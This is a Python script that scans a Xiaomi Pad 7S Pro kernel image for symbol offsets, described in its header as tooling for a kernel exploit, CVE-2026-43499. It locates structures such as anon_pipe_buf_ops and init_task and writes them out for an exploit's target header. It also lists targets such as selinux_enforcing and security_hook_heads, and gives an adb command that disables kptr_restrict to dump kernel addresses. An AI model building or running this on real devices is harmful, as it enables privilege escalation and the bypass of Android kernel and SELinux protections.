#!/usr/bin/env python3
"""
CVE-2026-43499 offset finder for Xiaomi Pad 7S Pro (violin)
Finds kernel symbol offsets by pattern matching in the kernel binary.
No root required - works directly on boot.img kernel.

Usage: python find_offsets.py
"""
import struct
import os
import sys

KERNEL_BIN = os.path.join(os.path.dirname(os.path.abspath(__file__)), "outputs", "kernel.bin")
OUTPUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "outputs", "target.h")

# ARM64 instruction encodings
RET = 0xD65F03C0
NOP = 0xD503201F
# LDR Xt, [Xn, #imm] patterns
def LDR_Xt_Xn_imm(xt, xn, imm12):
    """LDR Xt, [Xn, #imm12*8] (unsigned offset)"""
    return 0xF9400000 | (imm12 << 10) | (xn << 5) | xt

def STP_Xt_Xt2_Xn_imm(xt, xt2, xn, simm7, opc=2):
    """STP Xt, Xt2, [Xn, #simm7*8] (pre/post/index)"""
    return (0xA9000000 | (opc << 30) | (simm7 & 0x7F) << 15 | (xt2 << 10) | (xn << 5) | xt)


def read_kernel():
    with open(KERNEL_BIN, "rb") as f:
        return f.read()


def find_pattern(data, pattern, start=0, end=None):
    """Find all occurrences of a 4-byte pattern."""
    if end is None:
        end = len(data)
    results = []
    idx = start
    while idx <= end - 4:
        idx = data.find(pattern, idx, end)
        if idx < 0:
            break
        if idx % 4 == 0:  # ARM64 instructions are 4-byte aligned
            results.append(idx)
        idx += 4
    return results


def find_noop_llseek(data, text_end):
    """
    noop_llseek: return file->f_pos;
    ARM64: LDR X0, [X0, #f_pos_off]; RET
    f_pos offset in struct file (kernel 6.6): 0xa8
    Encoding: 0xF9400000 | (0xa8/8 << 10) | (0 << 5) | 0 = 0xF9415400
    """
    ldr_x0_x0_a8 = struct.pack("<I", LDR_Xt_Xn_imm(0, 0, 0xa8 // 8))  # LDR X0, [X0, #0xa8]
    ret = struct.pack("<I", RET)
    pattern = ldr_x0_x0_a8 + ret

    results = find_pattern(data, pattern, 0x10000, text_end)
    if results:
        # noop_llseek should be a simple 2-instruction function
        # Pick the one that's preceded by another RET or NOP (function boundary)
        for addr in results:
            if addr >= 4:
                prev = struct.unpack("<I", data[addr-4:addr])[0]
                if prev == RET or prev == NOP:
                    return addr
        return results[0]  # fallback: first match
    return None


def find_copy_splice_read(data, text_end):
    """
    copy_splice_read is a non-trivial function.
    Look for its prologue pattern: it typically starts with
    STP X29, X30, [SP, #-N]! (frame setup) and calls splice_to_pipe.
    We search by looking for a function that references 'splice_to_pipe'
    or by its distinctive register save pattern.

    Alternative approach: search for the string reference.
    copy_splice_read is in fs/splice.c, it's a well-known function.
    """
    # In kernel 6.6, copy_splice_read has this signature:
    # ssize_t copy_splice_read(struct file *in, loff_t *ppos,
    #                          struct pipe_inode_info *pipe, size_t len,
    #                          unsigned int flags)
    #
    # It calls copy_to_iter then splice_to_pipe
    # For now, return None - user needs to provide from kallsyms
    return None


def find_function_by_prologue(data, text_start, text_end, target_size_hint=None):
    """Generic function finder by STP X29,X30 prologue."""
    # STP X29, X30, [SP, #-N]!  (pre-index)
    # Common prologue patterns
    results = []
    for i in range(text_start, min(text_end, text_start + 0x2000000), 4):
        insn = struct.unpack("<I", data[i:i+4])[0]
        # STP x29, x30, [sp, #-N]!
        if (insn & 0xFFE07FFF) == 0xA9A07BFD:
            results.append(i)
    return results


def find_anon_pipe_buf_ops(data, text_end):
    """
    anon_pipe_buf_ops is a const struct in .rodata:
    struct pipe_buf_operations {
        int can_merge;              // 0x00: always 1
        unsigned int flags;         // 0x04: 0
        void (*release)(...);       // 0x08: anon_pipe_buf_release
        bool (*try_steal)(...);     // 0x10: anon_pipe_buf_try_steal
        bool (*get)(...);           // 0x18: generic_pipe_buf_get or NULL
    };
    """
    ktext_base = 0xFFFFFFC008000000
    candidates = []

    for off in range(0x100000, text_end - 0x20, 8):
        # can_merge = 1
        if struct.unpack_from("<I", data, off)[0] != 1:
            continue
        # flags = 0
        if struct.unpack_from("<I", data, off + 4)[0] != 0:
            continue
        # release should be a kernel text pointer
        release = struct.unpack_from("<Q", data, off + 8)[0]
        if release < ktext_base or release > ktext_base + 0x10000000:
            continue
        # try_steal should also be a kernel text pointer
        try_steal = struct.unpack_from("<Q", data, off + 16)[0]
        if try_steal < ktext_base or try_steal > ktext_base + 0x10000000:
            continue
        # get can be NULL or a pointer
        get_ptr = struct.unpack_from("<Q", data, off + 24)[0]
        if get_ptr != 0 and (get_ptr < ktext_base or get_ptr > ktext_base + 0x10000000):
            continue

        candidates.append(off)

    # Filter: the struct should be 8-byte aligned and in .rodata range
    # .rodata is typically between .text functions
    return candidates


def find_init_task_by_scan(data, data_start, data_end):
    """
    init_task is a large struct (task_struct, ~5KB+).
    In .data section, it's initialized with specific values:
    - .usage = REFCOUNT_INIT(1)  (usually 1)
    - .stack = init_stack
    - .tasks.next = &init_task.tasks
    - .tasks.prev = &init_task.tasks

    The self-referencing tasks list is the strongest signal.
    init_task.tasks.next == &init_task.tasks
    """
    ktext_base = 0xFFFFFFC008000000
    candidates = []

    # In the data section, look for patterns where
    # a pointer at offset X points back to offset X (self-referencing)
    # This is the init_task.tasks.next/prev pattern

    # tasks field is at offset 0x550 in task_struct (from caiman target)
    tasks_off = 0x550

    for base in range(data_start, data_end - 0x2000, 8):
        # Check if data[base + tasks_off] == &init_task.tasks
        # Which means data[base + tasks_off] == (ktext_base + data_start + base + tasks_off)
        # or data[base + tasks_off] == (data_start + base + tasks_off) for identity-mapped
        ptr = struct.unpack_from("<Q", data, base + tasks_off)[0]

        expected_virt = ktext_base + base + tasks_off
        if ptr == expected_virt:
            # Verify prev also points to same address
            prev = struct.unpack_from("<Q", data, base + tasks_off + 8)[0]
            if prev == expected_virt:
                candidates.append(base)

    return candidates


def main():
    print("=" * 60)
    print("CVE-2026-43499 Kernel Symbol Offset Finder")
    print("Xiaomi Pad 7S Pro (violin) - boot.img analysis")
    print("=" * 60)

    if not os.path.exists(KERNEL_BIN):
        print(f"ERROR: {KERNEL_BIN} not found")
        sys.exit(1)

    data = read_kernel()
    text_start = 0x10000
    text_end = 0x2070000
    data_start = 0x2070000
    data_end = len(data)

    print(f"Kernel binary: {len(data)} bytes")
    print(f".text: 0x{text_start:x} - 0x{text_end:x}")
    print(f".data: 0x{data_start:x} - 0x{data_end:x}")
    print()

    found = {}

    # 1. noop_llseek
    print("[*] Finding noop_llseek...")
    addr = find_noop_llseek(data, text_end)
    if addr:
        found["NOOP_LLSEEK_OFF"] = addr
        print(f"    Found at 0x{addr:x}")
    else:
        print("    NOT FOUND")

    # 2. anon_pipe_buf_ops
    print("[*] Finding anon_pipe_buf_ops...")
    candidates = find_anon_pipe_buf_ops(data, text_end)
    if candidates:
        # Pick the first candidate in .rodata range
        best = candidates[0]
        found["ANON_PIPE_BUF_OPS_OFF"] = best
        print(f"    Found at 0x{best:x} ({len(candidates)} candidates)")
        # Show the struct contents
        can_merge = struct.unpack_from("<I", data, best)[0]
        release = struct.unpack_from("<Q", data, best + 8)[0]
        try_steal = struct.unpack_from("<Q", data, best + 16)[0]
        get_ptr = struct.unpack_from("<Q", data, best + 24)[0]
        print(f"    can_merge={can_merge}, release=0x{release:x}, try_steal=0x{try_steal:x}, get=0x{get_ptr:x}")
    else:
        print("    NOT FOUND")

    # 3. init_task (in .data section)
    print("[*] Finding init_task (self-referencing task list)...")
    init_candidates = find_init_task_by_scan(data, data_start, data_end)
    if init_candidates:
        best = init_candidates[0]
        found["INIT_TASK_OFF"] = best
        print(f"    Found at 0x{best:x} ({len(init_candidates)} candidates)")
    else:
        print("    NOT FOUND (try different tasks_off)")

    # 4. Show results
    print()
    print("=" * 60)
    print("RESULTS")
    print("=" * 60)

    if found:
        print(f"\nFound {len(found)} symbols via binary analysis:")
        for name, addr in sorted(found.items(), key=lambda x: x[1]):
            print(f"  {name}: 0x{addr:08x}")
    else:
        print("\nNo symbols found via binary analysis.")

    # Write results to file
    results_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "outputs", "found_offsets.txt")
    with open(results_path, "w") as f:
        for name, addr in sorted(found.items(), key=lambda x: x[1]):
            f.write(f"{name} 0x{addr:08x}\n")
    print(f"\nResults saved to: {results_path}")

    # Symbols that NEED kallsyms
    print("\n" + "=" * 60)
    print("SYMBOLS REQUIRING /proc/kallsyms (need root)")
    print("=" * 60)
    needed = [
        ("ASHMEM_MISC_FOPS_OFF", "ashmem_misc_fops"),
        ("ASHMEM_FOPS_OFF", "ashmem_fops"),
        ("ASHMEM_IOCTL_OFF", "ashmem_ioctl"),
        ("ASHMEM_COMPAT_IOCTL_OFF", "ashmem_compat_ioctl"),
        ("ASHMEM_MMAP_OFF", "ashmem_mmap"),
        ("ASHMEM_OPEN_OFF", "ashmem_open"),
        ("ASHMEM_RELEASE_OFF", "ashmem_release"),
        ("ASHMEM_SHOW_FDINFO_OFF", "ashmem_show_fdinfo"),
        ("CONFIGFS_READ_ITER_OFF", "configfs_read_iter"),
        ("CONFIGFS_BIN_WRITE_ITER_OFF", "configfs_bin_write_iter"),
        ("COPY_SPLICE_READ_OFF", "copy_splice_read"),
        ("ROOT_TASK_GROUP_OFF", "root_task_group"),
        ("SELINUX_BLOB_SIZES_OFF", "selinux_blob_sizes"),
        ("SELINUX_ENFORCING_OFF", "selinux_enforcing"),
        ("SECURITY_HOOK_HEADS_OFF", "security_hook_heads"),
        ("KMALLOC_CACHES_OFF", "kmalloc_caches"),
        ("INIT_UTS_NS_OFF", "init_uts_ns"),
        ("EMPTY_ZERO_PAGE_OFF", "empty_zero_page"),
        ("SLIDE_NFULNL_LOGGER_OFF", "nfulnl_logger"),
        ("SLIDE_LOGGERS_0_1_OFF", "loggers"),
        ("SLIDE_RANDOM_BOOT_ID_DATA_OFF", "random_boot_id"),
        ("SLIDE_SYSCTL_BOOTID_OFF", "sysctl_bootid"),
    ]
    for macro, sym in needed:
        if macro not in found:
            print(f"  {macro}: {sym}")

    print(f"\nTo get these, run on ROOTED device:")
    print('  adb shell "su -c \'echo 0 > /proc/sys/kernel/kptr_restrict && cat /proc/kallsyms\'" > kallsyms.txt')
    print('  python gen_offsets.py kallsyms.txt')


if __name__ == "__main__":
    main()
